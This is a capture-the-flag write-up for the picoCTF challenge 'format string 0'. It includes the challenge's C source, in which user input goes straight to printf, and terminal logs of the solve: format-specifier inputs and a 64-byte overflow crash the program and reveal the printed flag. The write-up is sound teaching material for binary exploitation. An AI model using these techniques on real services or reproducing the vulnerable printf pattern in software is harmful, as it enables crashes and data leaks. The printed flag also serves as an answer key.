# picoGym Level 433: format string 0
Source: https://play.picoctf.org/practice/challenge/433

## Goal
Can you use your knowledge of format strings to make the customers happy?<br>
Download the binary here.<br>
https://artifacts.picoctf.net/c_mimas/77/format-string-0<br>
Download the source here.<br>
https://artifacts.picoctf.net/c_mimas/77/format-string-0.c<br>
Connect with the challenge instance here:<br>
nc mimas.picoctf.net 50026

## What I learned
```
Binary exploitation

Nothing checking format specifiers
```

## Solution
```
https://webshell.picoctf.org/

AsianHacker-picoctf@webshell:~$ wget https://artifacts.picoctf.net/c_mimas/77/format-string-0 https://artifacts.picoctf.net/c_mimas/77/format-string-0.c ⌨️
--2025-10-01 22:29:49--  https://artifacts.picoctf.net/c_mimas/77/format-string-0
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.170.131.33, 3.170.131.18, 3.170.131.77, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.170.131.33|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16632 (16K) [application/octet-stream]
Saving to: 'format-string-0'

format-string-0                                            100%[======================================================================================================================================>]  16.24K  --.-KB/s    in 0.004s  

2025-10-01 22:29:49 (3.75 MB/s) - 'format-string-0' saved [16632/16632]

--2025-10-01 22:29:49--  https://artifacts.picoctf.net/c_mimas/77/format-string-0.c
Reusing existing connection to artifacts.picoctf.net:443.
HTTP request sent, awaiting response... 200 OK
Length: 2784 (2.7K) [application/octet-stream]
Saving to: 'format-string-0.c'

format-string-0.c                                          100%[======================================================================================================================================>]   2.72K  --.-KB/s    in 0s      

2025-10-01 22:29:49 (629 MB/s) - 'format-string-0.c' saved [2784/2784]

FINISHED --2025-10-01 22:29:49--
Total wall clock time: 0.2s
Downloaded: 2 files, 19K in 0.004s (4.37 MB/s)

AsianHacker-picoctf@webshell:~$ cat format-string-0.c ⌨️
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag); 👀
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r"); 👀
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}

# Method 1: Not correctly checking format specifiers
AsianHacker-picoctf@webshell:~$ nc mimas.picoctf.net 50026 ⌨️
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese ⌨️
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak ⌨️
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405} 🔐

# Method 2: buffer overflow
AsianHacker-picoctf@webshell:~$ python3 -c "print('A'*64)" ⌨️
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AsianHacker-picoctf@webshell:~$ nc mimas.picoctf.net 50026 ⌨️
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ⌨️
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405} 🔐
```

## Flag
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}

## Continue
[Continue](./picoGym0490.md)